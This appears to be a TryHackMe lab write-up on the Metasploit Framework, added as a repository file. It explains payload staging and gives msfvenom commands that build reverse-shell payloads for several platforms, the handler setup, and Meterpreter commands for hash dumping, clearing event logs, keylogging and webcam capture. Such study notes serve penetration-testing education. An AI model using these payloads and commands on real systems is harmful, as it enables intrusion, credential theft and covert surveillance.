@@ -1,0 +1,116 @@
+Metasploit-Framework-Overview-THM-Write-Up-
+Hands-on TryHackMe exploitation write-ups and notes covering Metasploit, payload generation, post-exploitation, and credential cracking.
+
+Metasploit Framework
+
+Room Context: Understanding and mastering the Metasploit Framework for penetration testing Objective: Learn to leverage Metasploit's modular architecture for exploitation, post-exploitation, and payload delivery
+
+What is Metasploit? The Metasploit Framework is a modular penetration testing platform used to develop, test, and execute exploits against vulnerable systems. It provides a unified environment for exploitation, post-exploitation, payload generation, and auxiliary tasks such as scanning and enumeration. Why it matters: Metasploit consolidates the entire exploitation workflow into one framework, eliminating the need to juggle multiple tools and allowing security professionals to focus on methodology rather than tooling.
+
+Core Components msfconsole The primary command-line interface used to interact with Metasploit modules and sessions. This is your main workspace. Modules Reusable components that perform specific actions such as exploitation, scanning, or post-exploitation. Tools Standalone utilities that assist in vulnerability research and exploit development. Common tools include:
+
+msfvenom - Payload generation pattern_create - Buffer overflow pattern creation pattern_offset - Offset calculation for exploits
+
+Metasploit Module Types Auxiliary
+
+Used for scanning, fuzzing, sniffing, crawling, and information gathering No direct exploitation Commonly used during reconnaissance Example use case: Port scanning internal networks without nmap
+
+Encoders
+
+Encode payloads to evade signature-based antivirus detection Limited effectiveness against modern endpoint protection Reality check: Modern EDR solutions often detect behavior, not just signatures
+
+Evasion
+
+Designed to bypass security controls such as Windows Defender or AppLocker More targeted and aggressive than encoders Use responsibly and only in authorized environments
+
+Exploits
+
+Take advantage of known vulnerabilities Organized by platform or service (Windows, Linux, SMB, HTTP, etc.) Think of these as the "attack" modules
+
+NOPs
+
+No-operation instructions Used as padding to maintain payload alignment and stability Critical for buffer overflow exploits
+
+Payloads Code executed after successful exploitation. Used to obtain shells, run commands, or deploy backdoors. Payload Types Adapters
+
+Wrap payloads into different formats (e.g., PowerShell)
+
+Singles
+
+Self-contained payloads that execute immediately Notation: shell_reverse_tcp (underscores)
+
+Stagers
+
+Small payloads that establish a connection Notation: shell/reverse_tcp (forward slash)
+
+Stages
+
+Larger payloads downloaded by the stager
+
+!!Pro Tip: The naming convention tells you everything!!
+
+shell_reverse_tcp → single payload (all-in-one) shell/reverse_tcp → staged payload (two-part)
+
+Post
+
+Used after access is gained Includes privilege escalation, credential dumping, persistence, and enumeration This is where the real work begins after initial compromise
+
+Understanding Metasploit Prompts Metasploit operates in different contexts, each with its own prompt. Always confirm your prompt before running commands to avoid executing commands in the wrong context. PromptContextCommands Acceptedroot@ip-10-10-X-X:~#System ShellNormal OS commands only (NOT Metasploit)msf6 >msfconsoleMetasploit commands, no module loadedmsf6 exploit(windows/smb/ms17_010_eternalblue) >Module ContextModule is selected and being configuredmeterpreter >Meterpreter SessionMeterpreter-specific commandsC:\Windows\system32>Target System ShellCommands execute on compromised system Common mistake: Running show options at the system shell prompt won't work because you're not in Metasploit context.
+
+Port Scanning with Metasploit Metasploit includes multiple auxiliary modules for port scanning. To search: search portscan These modules are useful for quick reconnaissance inside Metasploit without external tools. Particularly helpful when you want to keep all reconnaissance data in one place.
+
+Payload Selection Quick Reference ScenarioRecommended PayloadWhy?Default / first attemptreverse_tcpMost reliable, works through NATReverse failsbind_tcpTarget initiates connection to youBoth failreverse_httpsBlends with normal web trafficNeed stealthreverse_http / reverse_httpsHarder to detect in network logsAV blocking payloadEncoded payloadsEvades signature detectionOnly command execution neededexec or simple shellLighter footprint Troubleshooting tip: If reverse shells fail, check:
+
+Firewall rules on both attacker and target NAT/port forwarding configuration Handler is running with correct LHOST/LPORT
+
+Payload Generation with msfvenom msfvenom is used to generate payloads in multiple formats depending on the target system. Key variables:
+
+LHOST = Attacker IP (your machine) LPORT = Listening port (choose high port like 4444)
+
+Linux (ELF) bashmsfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf chmod +x rev_shell.elf Windows bashmsfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe PHP bashmsfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php ASP bashmsfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp Python bashmsfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py Setting Up the Handler All reverse payloads require a handler to catch the connection: bashuse exploit/multi/handler set payload <payload_type> set LHOST <your_IP> set LPORT <your_PORT> run Don't forget this step! Your payload will call home but nobody will answer without a handler running.
+
+Meterpreter Core Commands Once you've established a Meterpreter session, these commands give you control. Session Control
+
+background - Background current session exit - Terminate session sessions - List all active sessions guid - Get session GUID
+
+File System
+
+ls, cd, pwd - Navigate filesystem cat, edit - View/edit files upload, download - Transfer files search - Find files rm - Delete files
+
+Networking
+
+ifconfig - Network configuration netstat - Active connections arp - ARP cache portfwd - Port forwarding/pivoting route - Routing table manipulation
+
+System
+
+sysinfo - System information getuid - Current user getpid - Process ID ps - Process list shell - Drop to system shell execute - Run commands reboot, shutdown - System control
+
+Privilege & Credentials
+
+getsystem - Attempt privilege escalation hashdump - Extract password hashes clearev - Clear event logs (use cautiously)
+
+Surveillance (Lab Use Only) These commands should ONLY be used in authorized lab environments
+
+screenshot - Capture screen screenshare - Live screen sharing keyscan_start / keyscan_dump - Keylogging record_mic - Audio recording webcam_snap - Webcam capture
+
+External Cracking Tools If hashes are recovered using hashdump:
+
+Extract NTLM hashes from Metasploit Crack locally with:
+
+Hashcat - GPU-accelerated, very fast John the Ripper - CPU-based, reliable
+
+Validate weak passwords using CrackStation.net
+
+Pro tip: Many corporate environments still use weak passwords. Focus on common patterns first (Summer2024!, CompanyName123, etc.)
+
+Typical Metasploit Workflow
+
+Reconnaissance - Use auxiliary modules for scanning Exploitation - Select and configure exploit module Payload Delivery - Choose appropriate payload for target Post-Exploitation - Gather credentials, escalate privileges Lateral Movement - Pivot to other systems Maintain Access - Establish persistence (lab only) Clean Up - Remove traces (in real engagements)
+
+Key Takeaways Always verify Metasploit context before running commands Choose payloads based on target OS and defensive measures Understand payload staging to troubleshoot failed shells Post-exploitation is as important as initial access Document everything for your report
+
+Ethical Reminder This knowledge is powerful. Use it responsibly.
+
+Only test systems you have explicit written permission to attack Follow responsible disclosure practices if you find vulnerabilities Respect scope boundaries in penetration tests Remember: Unauthorized access is illegal, regardless of intent
+
+The skills learned here are for authorized security testing, CTF competitions, and educational environments like TryHackMe only.
